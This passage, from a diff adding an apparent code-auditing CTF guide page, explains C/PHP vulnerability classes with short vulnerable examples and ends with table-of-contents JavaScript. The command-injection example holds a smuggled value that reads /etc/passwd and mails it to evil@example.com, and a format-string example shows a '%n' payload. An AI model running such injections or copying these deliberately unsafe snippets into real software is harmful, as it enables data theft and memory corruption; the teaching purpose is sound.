+                                    <li>Example: (Conceptual based on cheatsheet description of curl flaw)
+                                        <pre><code class="language-c">// If curl's URL parser had a flaw where a crafted URL format string
+// triggered verbose debug output intended for developers, that output
+// might leak internal state or sensitive info processed by curl.
+curl_easy_setopt(curl, CURLOPT_URL, malicious_url);
+curl_easy_perform(curl); // Debug info printed to console/log</code></pre>
+                                    </li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <h4>7. Cryptographic Weaknesses</h4>
+                        <ul>
+                            <li><strong>7.1 Weak Encryption Algorithm</strong>
+                                <ul>
+                                    <li>Description: Using cryptographic algorithms known to be weak or compromised (e.g., DES, MD5 for hashing passwords, RC4 in some contexts). Does not provide adequate confidentiality or integrity against modern attacks.</li>
+                                    <li>Example: (Conceptual based on cheatsheet description of PHP mcrypt)
+                                        <pre><code class="language-php">// Using MCRYPT_DES makes the encryption vulnerable.
+// Should use stronger algorithms like AES (e.g., MCRYPT_RIJNDAEL_128).
+td = mcrypt_module_open(MCRYPT_DES, ...);</code></pre>
+                                    </li>
+                                </ul>
+                            </li>
+                            <li><strong>7.2 Predictable Random Number Generation</strong>
+                                <ul>
+                                    <li>Description: Using pseudo-random number generators (PRNGs) that are improperly seeded or inherently weak, allowing attackers to predict their output. Critical for session tokens, cryptographic keys, nonces, etc.. Seeding with predictable values like time or process ID is insecure. Use cryptographically secure PRNGs (CPRNGs) provided by the OS or crypto libraries.</li>
+                                    <li>Example: (Conceptual based on cheatsheet description of OpenSSL flaw)
+                                        <pre><code class="language-c">// If RAND_bytes() relies on a PRNG state that wasn't properly seeded
+// with sufficient entropy (e.g., /dev/urandom or platform equivalent),
+// the output might be predictable, especially on embedded systems or
+// VMs immediately after boot.
+if (!RAND_bytes(random_bytes, sizeof(random_bytes))) { /* error */ }</code></pre>
+                                    </li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <h4>8. String Vulnerabilities </h4>
+                        <ul>
+                            <li><strong>8.1 Format String Vulnerabilities</strong>
+                                <ul>
+                                    <li>Description: User input controls the format string argument to <code>printf</code> family functions. Allows reading stack memory (<code>%x</code>), dereferencing pointers (<code>%s</code>), and writing to memory (<code>%n</code>).</li>
+                                    <li>Example: (Conceptual based on cheatsheet curl example)
+                                        <pre><code class="language-c">// If url is "[http://example.com/%x%x%n](http://example.com/%x%x%n)" and passed somehow
+// as format string to printf-like function internally.
+printf(url); // Vulnerable if url comes from user</code></pre>
+                                    </li>
+                                    <li>Auditing Tip: Search <code>printf</code>, <code>sprintf</code>, <code>syslog</code>, etc. for non-static format strings. Trace back to user input.</li>
+                                </ul>
+                            </li>
+                            <li><strong>8.2 Unbounded String Copies</strong>
+                                <ul>
+                                    <li>Description: Using functions like <code>strcpy</code>, <code>strcat</code>, <code>sprintf</code> (no size limit), <code>gets</code> that don't prevent writing past the end of the destination buffer.</li>
+                                    <li>Example:
+                                        <pre><code class="language-c">char Password[80];
+// gets() is inherently unsafe, reads until newline regardless of buffer size
+gets(Password); // Classic stack buffer overflow if input > 79 chars</code></pre>
+                                    </li>
+                                    <li>Algorithm:<pre><code>type STRING[SIZE]
+func_read_unbounded(STRING) // Input copied > SIZE</code></pre></li>
+                                </ul>
+                            </li>
+                             <li><strong>8.3 Null-Termination Errors</strong>
+                                <ul>
+                                    <li>Description: Strings not properly terminated with a null character (<code>\0</code>). Functions relying on NUL termination (like <code>strlen</code>, <code>strcpy</code>, <code>printf %s</code>) will read past the intended end of the string data into adjacent memory. Can happen with <code>strncpy</code> if source >= destination size.</li>
+                                    <li>Example:
+                                        <pre><code class="language-c">char a[16];
+char b[16];
+char c[32];
+// strncpy does not guarantee null termination if src >= dest size
+strncpy(a, "0123456789abcdef", sizeof(a)); // a might not be null-terminated
+strncpy(b, "0123456789abcdef", sizeof(b)); // b might not be null-terminated
+// If a is not null-terminated, strcpy reads past end of 'a' into 'b' etc.
+strcpy(c, a); // Potential read overflow if 'a' wasn't terminated</code></pre>
+                                    </li>
+                                    <li>Algorithm:(Interpreted - copy without ensuring null term) <pre><code>type DEST[SIZE_DEST], SRC[SIZE_SRC] // where SIZE_SRC >= SIZE_DEST
+func_bounded_copy_no_term(DEST, SRC, SIZE_DEST)
+// DEST may not have '\0'
+func_read_terminated(DEST) // Reads past end of DEST buffer</code></pre></li>
+                                </ul>
+                            </li>
+                            <li><strong>8.4 String Truncation</strong>
+                                <ul>
+                                    <li>Description: Cutting a string short, often by bounded copy functions (<code>strncpy</code>, <code>snprintf</code>). Can be a vulnerability if critical data is lost (e.g., path components, security suffixes) or if subsequent code assumes the full string was processed. <code>snprintf</code> may return the number of bytes <em>needed</em>, requiring careful checking against buffer size. Also relates to null-termination if truncation prevents the null byte from being written.</li>
+                                    <li>Example:
+                                        <pre><code class="language-c">char destination[5];
+char source[] = "This is a long string";
+// Copies only first 5 bytes: "This "
+// No null terminator is written because source size >= dest size.
+strncpy(destination, source, sizeof(destination));
+// printf reads past end of destination buffer into adjacent memory.
+printf("%s\n", destination);</code></pre>
+                                    </li>
+                                    <li>Algorithm:<pre><code>type SOURCE[], DEST[SIZE]
+// SOURCE length >= SIZE
+func_safe_copy_truncates(DEST, SOURCE, SIZE)
+// DEST contains first SIZE bytes of SOURCE, maybe no '\0'
+use(DEST) // Subsequent use assumes full string or expects '\0'</code></pre></li>
+                                </ul>
+                            </li>
+                            <li><strong>8.5 Improper Data Sanitization (Command/SQL/Path Injection)</strong>
+                                <ul>
+                                    <li>Description: Failing to validate, sanitize, or escape user-controlled input that is used to construct commands, queries, file paths, or other strings with special syntax (metacharacters). Allows attackers to inject malicious syntax.</li>
+                                    <li>Example (Command Injection):
+                                        <pre><code class="language-c">char buffer[200];
+char *addr = "bogus@addr.com; cat /etc/passwd | mail evil@example.com"; // User input
+// Constructing command string with unsanitized input
+sprintf(buffer, "/bin/mail %s < /tmp/email", addr);
+// Executes /bin/mail bogus@addr.com; cat /etc/passwd | mail evil@example.com
+system(buffer);</code></pre>
+                                    </li>
+                                    <li>Algorithm:<pre><code>type DATA = user_input_with_metachars
+type COMMAND = construct_string("cmd ", DATA)
+func_exec(COMMAND)</code></pre></li>
+                                </ul>
+                            </li>
+                        </ul>
+                    </div>
+                </details>
+
+            </article>
+        </main>
+    </div>
+
+    <footer class="py-8 border-t border-slate-800 md:pl-72 lg:pl-80">
+        <div class="container mx-auto px-6 text-center text-slate-500 text-sm">
+            &copy; 2025 Code Auditor CTF. All Rights Reserved.
+        </div>
+    </footer>
+
+    <script>
+        // --- TOC Generation and Interaction ---
+        document.addEventListener('DOMContentLoaded', () => {
+            const tocList = document.getElementById('toc-list');
+            const mainContent = document.querySelector('main article');
+            // Select only H2 and H3 tags within the main article content
+            // This selector is more robust against picking up comments or other elements.
+            const headings = mainContent.querySelectorAll('h2, h3, h4');
+            let currentH2ListItem = null;
+            let currentH3List = null;
+
+            // --- Helper function to create slug (Ensures valid ID) ---
+            function createSlug(text, index) {
+                const baseSlug = text ? text.toLowerCase()
+                            .replace(/[^a-z0-9\s-]/g, '') // Remove non-alphanumeric chars except space/hyphen
+                            .trim()
+                            .replace(/\s+/g, '-') // Replace spaces with hyphens
+                            .replace(/-+/g, '-') // Replace multiple hyphens with single
+                            : '';
+                // Ensure ID starts with a letter and handle empty/duplicate slugs
+                let slug = baseSlug && /^[a-zA-Z]/.test(baseSlug) ? baseSlug : `section-${baseSlug || index}`;
+                // Ensure uniqueness (simple check)
+                let counter = 1;
+                let finalSlug = slug;
+                while (document.getElementById(finalSlug)) {
+                    finalSlug = `${slug}-${counter}`;
+                    counter++;
+                }
+                return finalSlug;
+            }
+
+            // --- Generate TOC Items ---
+            headings.forEach((heading, index) => {
+                // Ensure heading has a valid ID, generate/fix if necessary
+                let id = heading.id;
+                if (!id || !/^[a-zA-Z][\w:.-]*$/.test(id)) {
+                    id = createSlug(heading.textContent, index);
+                    heading.id = id; // Assign the valid ID back to the heading
+                }
+
+                const level = heading.tagName.toLowerCase(); // 'h2' or 'h3'
+                const text = heading.textContent || 'Unnamed Section'; // Provide default text
+
+                const listItem = document.createElement('li');
+                listItem.classList.add('toc-item', `toc-level-${level}`); // Add level class
+
+                // div container holds the link and the toggle button (if any)
+                const linkContainer = document.createElement('div');
+                linkContainer.classList.add('flex', 'items-center', 'justify-between');
+
+                const link = document.createElement('a');
+                link.href = `#${id}`;
+                link.textContent = text;
+                // Base classes for links
+                link.classList.add('block', 'py-1', 'px-2', 'rounded-md', 'hover:bg-slate-700', 'hover:text-slate-100', 'truncate'); // Adjusted hover style
+
+                linkContainer.appendChild(link); // Add link to container first
+                listItem.appendChild(linkContainer); // Add container to list item
+
+                if (level === 'h2') {
+                    tocList.appendChild(listItem);
+                    currentH2ListItem = listItem; // Track current H2 item
+                    currentH3List = null; // Reset H3 list for new H2
+                    // Toggle button will be added later if H3s are found under this H2
+                } else if (level === 'h3' && currentH2ListItem) {
+                    // First H3 found for the current H2?
+                    if (!currentH3List) {
+                        // Create the UL for H3 items
+                        currentH3List = document.createElement('ul');
+                        currentH3List.classList.add('mt-1', 'ml-4', 'pl-3', 'border-l', 'border-slate-700', 'hidden'); // Start hidden, add indentation styles
+                        currentH2ListItem.appendChild(currentH3List); // Append the H3 list to the H2 list item
+                        currentH2ListItem.classList.add('has-children'); // Mark H2 as having children
+
+                        // Add the toggle button to the H2's linkContainer
+                        const h2LinkContainer = currentH2ListItem.querySelector('div'); // Get the H2's container
+                        if (h2LinkContainer) { // Ensure container exists
+                            const toggleButton = document.createElement('span');
+                            toggleButton.innerHTML = '►'; // Start collapsed
+                            toggleButton.classList.add('toc-toggle', 'collapsed');
+                            toggleButton.setAttribute('aria-expanded', 'false'); // Accessibility
+                            toggleButton.setAttribute('aria-label', `Toggle ${h2LinkContainer.querySelector('a')?.textContent || 'submenu'}`);
+
+                            // Click handler for the toggle button
+                            toggleButton.onclick = (e) => {
+                                e.stopPropagation(); // Prevent link navigation
+                                // Find the UL sibling within the same parent LI
+                                const sublist = toggleButton.closest('li')?.querySelector('ul');
+                                if (sublist) {
+                                    const isHidden = sublist.classList.toggle('hidden');
+                                    toggleButton.classList.toggle('collapsed', isHidden);
+                                    toggleButton.innerHTML = isHidden ? '►' : '▼';
+                                    toggleButton.setAttribute('aria-expanded', String(!isHidden)); // Update aria-expanded
+                                }
+                            };
+                            // Insert toggle button *before* the link for better layout control if needed, or keep after
+                             h2LinkContainer.appendChild(toggleButton); // Add button AFTER the link
+                        }
+                    }
+                    // Add the H3 list item to the H3 list
+                    currentH3List.appendChild(listItem);
+                }
+                else if (level === 'h4') {
+
+            // H4 should nest under the most recent H3.
+            // Find the LI element for the last H3 added to the current H3 list (currentH3List).
+            const lastH3ListItem = currentH3List ? currentH3List.lastElementChild : null;
+
+            if (lastH3ListItem) {
+                // Check if this H3 LI already has a UL (nested list) for H4s
+                let h4List = lastH3ListItem.querySelector('ul');
+                if (!h4List) {
+                    // If no H4 list exists yet, create one
+                    h4List = document.createElement('ul');
+                    // Add styling for indentation and borders - adjust 'ml-4' for desired indent
+                    h4List.classList.add('mt-1', 'ml-4', 'pl-3', 'border-l', 'border-slate-700');
+                    // Decide if H4 lists should start collapsed - remove 'hidden' to start expanded
+                    // h4List.classList.add('hidden');
+                    lastH3ListItem.appendChild(h4List);
+
+                    // Optional: Add a toggle button to the H3 if you want H4 sections collapsible
+                    // const h3LinkContainer = lastH3ListItem.querySelector('div');
+                    // if (h3LinkContainer && !h3LinkContainer.querySelector('.toc-toggle')) {
+                    //    const toggleButton = document.createElement('span');
+                    //     // Configure toggle button similar to H2 toggle...
+                    //     h3LinkContainer.appendChild(toggleButton);
+                    // }
+                }
+                // Add the current H4 list item (listItem) to the H4 list
+                h4List.appendChild(listItem);
+            }
+            // If an H4 is found but there's no preceding H3 in the current H2 section, it's ignored.
+        }
+        
+        });
+
+            // --- TOC Link Click Handling (Smooth Scroll & Close Mobile Menu) ---
+            tocList.addEventListener('click', (event) => {
+                // Only act if an actual link (A tag) was clicked
+                if (event.target.tagName === 'A' && event.target.href) {
+                    // Prevent default jump
+                    event.preventDefault();
+                    const targetId = event.target.getAttribute('href').substring(1);
+                    const targetElement = document.getElementById(targetId);
+
+                    if (targetElement) {
+                        // Calculate scroll position (consider sticky header height)
+                        const headerOffset = document.querySelector('nav')?.offsetHeight || 60; // Get nav height or default
+                        const elementPosition = targetElement.getBoundingClientRect().top;
+                        const offsetPosition = elementPosition + window.pageYOffset - headerOffset - 10; // Add small buffer
+
+                        window.scrollTo({
+                            top: offsetPosition,
+                            behavior: "smooth"
+                        });
+
+                        const parentDetails = targetElement.closest('details');
+                            // If found and it's not already open, open it
+                            if (parentDetails && !parentDetails.hasAttribute('open')) {
+                                parentDetails.setAttribute('open', '');
+                            }
+                    }
+
+                    // Close mobile sidebar if open
+                    const sidebar = document.getElementById('toc-sidebar');
+                    const body = document.body;
+                    const tocToggleButton = document.getElementById('toc-toggle-btn');
+                    if (window.innerWidth < 768 && sidebar.classList.contains('translate-x-0')) {
+                         sidebar.classList.remove('translate-x-0');
+                         sidebar.classList.add('-translate-x-full');
+                         body.classList.remove('overflow-hidden'); // Re-enable body scroll
+                         tocToggleButton.setAttribute('aria-expanded', 'false');
+                    }
+                    // Active link highlighting is handled by Intersection Observer below
+                }
+            });
+
+            // --- Mobile TOC Toggle ---
+            const tocToggleButton = document.getElementById('toc-toggle-btn');
+            const sidebar = document.getElementById('toc-sidebar');
+            const body = document.body;
+
+            tocToggleButton.addEventListener('click', () => {
+                const isOpening = sidebar.classList.contains('-translate-x-full');
+                sidebar.classList.toggle('-translate-x-full', !isOpening);
+                sidebar.classList.toggle('translate-x-0', isOpening);
+                body.classList.toggle('overflow-hidden', isOpening);
+                tocToggleButton.setAttribute('aria-expanded', String(isOpening));
+            });
+
+            // --- Active Link Highlighting on Scroll ---
+            const tocLinks = Array.from(tocList.querySelectorAll('a'));
+            let activeLink = null; // Track the currently highlighted link element
+
+            const observerCallback = (entries) => {
+                let intersectingHeadings = [];
+                 entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        intersectingHeadings.push(entry.target);
+                    }
+                });
+
+                // If multiple are intersecting, choose the topmost one
+                intersectingHeadings.sort((a, b) => a.getBoundingClientRect().top - b.getBoundingClientRect().top);
+
+                let newActiveLink = null;
+                if (intersectingHeadings.length > 0) {
+                    const topHeadingId = intersectingHeadings[0].id;
+                    newActiveLink = tocList.querySelector(`a[href="#${topHeadingId}"]`);
+                } else if (!activeLink && tocLinks.length > 0) {
+                     // If nothing is intersecting and nothing is active, maybe highlight the first one? Optional.
+                    // newActiveLink = tocLinks[0];
+                }
+
+
+                // Update active state only if the link changed
+                if (newActiveLink && newActiveLink !== activeLink) {
+                    // Remove active class from the previous link
+                    if (activeLink) {
+                        activeLink.classList.remove('active');
+                    }
+
+                    // Add active class to the new link
+                    newActiveLink.classList.add('active');
+                    activeLink = newActiveLink; // Update the tracked active link
+
+                    // Auto-expand parent H2 if an H3 becomes active
+                    const parentLi = newActiveLink.closest('li.has-children'); // Find the parent H2 LI
+                    if (parentLi) {
+                        const sublist = parentLi.querySelector('ul');
+                        const toggle = parentLi.querySelector('.toc-toggle');
+                        if (sublist && toggle && sublist.classList.contains('hidden')) {
+                            sublist.classList.remove('hidden');
+                            toggle.classList.remove('collapsed');
+                            toggle.innerHTML = '▼';
+                            toggle.setAttribute('aria-expanded', 'true');
+                        }
+                    }
+                } else if (!newActiveLink && activeLink) {
+                     // If nothing is intersecting, remove active class from the current link
+                     // This prevents a link staying active when scrolling above the first heading
+                     // activeLink.classList.remove('active');
+                     // activeLink = null;
+                     // Decide if you want to keep the last one active or clear it. Keeping it is often preferred.
+                }
+            };
+
+             // Adjust rootMargin: top edge, right edge, bottom edge, left edge
+             // -65px: start observing 65px below the top edge (account for nav)
+             // 0px: observe full width
+             // -40%: stop observing when the element is in the bottom 40% of the viewport
+            const observerOptions = {
+                rootMargin: '-65px 0px -40% 0px',
+                threshold: 0 // Trigger as soon as any part enters/leaves zone
+            };
+
+            // Set first TOC item as active by default
+            if (tocLinks.length > 0) {
+                // Find the first visible H2 link
+                const firstVisibleLink = tocLinks.find(link => {
+                    const targetId = link.getAttribute('href').substring(1);
+                    const targetElement = document.getElementById(targetId);
+                    return targetElement !== null;
+                });
+                
+                if (firstVisibleLink) {
+                    firstVisibleLink.classList.add('active');
+                    activeLink = firstVisibleLink;
+                }
+            }
+
+            const observer = new IntersectionObserver(observerCallback, observerOptions);
+            headings.forEach(heading => {
+                if (heading) { // Ensure heading exists before observing
+                    observer.observe(heading);
+                }
+            });
+
+        });
+
+        // Fix for details/summary elements
+        document.addEventListener('DOMContentLoaded', () => {
+            // Get all details elements
+            const allDetails = document.querySelectorAll('details');
+            
+            // Add click handlers to each summary element
+            allDetails.forEach(detail => {
+                const summary = detail.querySelector('summary');
+                if (summary) {
+                    summary.addEventListener('click', (e) => {
+                        // This prevents the default behavior and lets us handle it manually
+                        e.preventDefault();
+                        
+                        // Toggle the open attribute
+                        if (detail.hasAttribute('open')) {
+                            detail.removeAttribute('open');
+                        } else {
+                            detail.setAttribute('open', '');
+                        }
+                    });
+                }
+            });
+        });
+    </script>
+
+</body>
+</html>
